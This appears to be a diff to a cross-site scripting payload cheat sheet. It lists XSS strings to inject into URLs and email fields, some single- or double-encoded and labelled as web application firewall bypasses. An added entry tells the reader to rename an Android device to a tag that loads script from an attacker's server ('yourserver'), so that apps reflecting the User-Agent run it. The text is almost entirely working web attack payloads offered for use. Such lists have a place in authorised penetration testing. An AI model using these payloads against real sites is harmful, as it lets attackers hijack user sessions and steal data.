@@ -6,7 +6,9 @@ https://xxx.com/path/"><script>alert(1)</script>                                
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E                              --> Best Email XSX
 ["');alert('XSS');//"]@gmail.com                                                   --> Login Email (WAF Bypass)
 test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E      --> Double Encoding the uppper payload
-
+1. Rename your device to ex:                                                       --> RXSS for Android
+"><script/src=//yourserver>//"
+2. An application might trigger this XSS via your User-Agent which will contain your device name 
                                                                     ## Normal ##
 
 <img src=1 onerror=alert("XSS")>
